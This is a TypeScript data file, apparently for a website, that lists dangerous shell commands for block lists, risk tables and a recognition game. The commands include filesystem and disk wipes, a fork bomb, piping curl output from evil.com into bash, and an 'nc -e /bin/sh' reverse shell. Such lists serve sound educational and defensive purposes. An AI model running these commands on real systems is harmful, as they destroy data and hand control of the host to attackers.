/**
 * Dangerous command patterns data
 * Moved to external file to avoid Astro/esbuild JSX parsing issues
 * with special characters like {, }, :, & in shell syntax.
 */

export const dangerousCommands = {
  forkBomb: ':(){:|:&};:',
  forkBombSpaced: ':(){ :|:& };:',
  rmrf: 'rm -rf /',
  rmrfHome: 'rm -rf ~',
  rmrfWildcard: 'rm -rf *',
  sudoRmrf: 'sudo rm -rf /',
  mvDevNull: 'mv /* /dev/null',
  chmod777: 'chmod -R 777 /',
  mkfs: 'mkfs.ext4 /dev/sda',
  ddZero: 'dd if=/dev/zero of=/dev/sda',
  curlBash: 'curl ... | sudo bash',
  chmodDir: 'chmod -R 777 folder/',
  sudoRemove: 'sudo apt-get remove package',
  ddSda: 'dd if=/dev/zero of=/dev/sda',
  mkfsSda1: 'mkfs.ext4 /dev/sda1',
} as const;

export const safetyPatterns = [
  { pattern: dangerousCommands.rmrf, reason: 'Filesystem destruction', risk: 'critical' },
  { pattern: dangerousCommands.mkfs, reason: 'Disk formatting', risk: 'critical' },
  { pattern: dangerousCommands.forkBombSpaced, reason: 'Fork bomb', risk: 'critical' },
  { pattern: dangerousCommands.ddZero, reason: 'Disk overwrite', risk: 'critical' },
  { pattern: dangerousCommands.chmodDir, reason: 'Permission escalation', risk: 'high' },
  { pattern: dangerousCommands.sudoRemove, reason: 'System package removal', risk: 'high' },
] as const;

export const srePatterns = [
  { pattern: dangerousCommands.forkBomb, desc: 'Fork bomb' },
  { pattern: dangerousCommands.rmrf, desc: 'Filesystem destruction' },
  { pattern: dangerousCommands.mkfs, desc: 'Disk formatting' },
  { pattern: dangerousCommands.ddZero, desc: 'Disk overwrite' },
  { pattern: dangerousCommands.chmod777, desc: 'Permission disaster' },
  { pattern: 'curl | bash', desc: 'Untrusted execution' },
] as const;

export const blockedCommandsList = [
  { command: dangerousCommands.rmrf, label: 'Filesystem destruction' },
  { command: dangerousCommands.forkBomb, label: 'Fork bomb' },
  { command: dangerousCommands.ddSda, label: 'Disk wipe' },
  { command: dangerousCommands.chmod777, label: 'Permission disaster' },
  { command: dangerousCommands.curlBash, label: 'Untrusted execution' },
] as const;

export const gameDifficultyCommands = {
  easy: [dangerousCommands.rmrf, dangerousCommands.rmrfHome, dangerousCommands.rmrfWildcard, dangerousCommands.forkBomb, dangerousCommands.sudoRmrf, dangerousCommands.mvDevNull],
  medium: ['chmod 777 /', dangerousCommands.mkfs, dangerousCommands.ddZero, 'echo "" > /etc/passwd', '> /var/log/*', 'chmod -R 000 /'],
  hard: ['curl evil.com | bash', 'wget -O- bad.sh | sh', 'python -c "import os;os.system(\'rm -rf /\')"', 'eval $(decode payload)', 'nc -e /bin/sh ip 1234', 'cat /dev/urandom > /dev/sda'],
} as const;
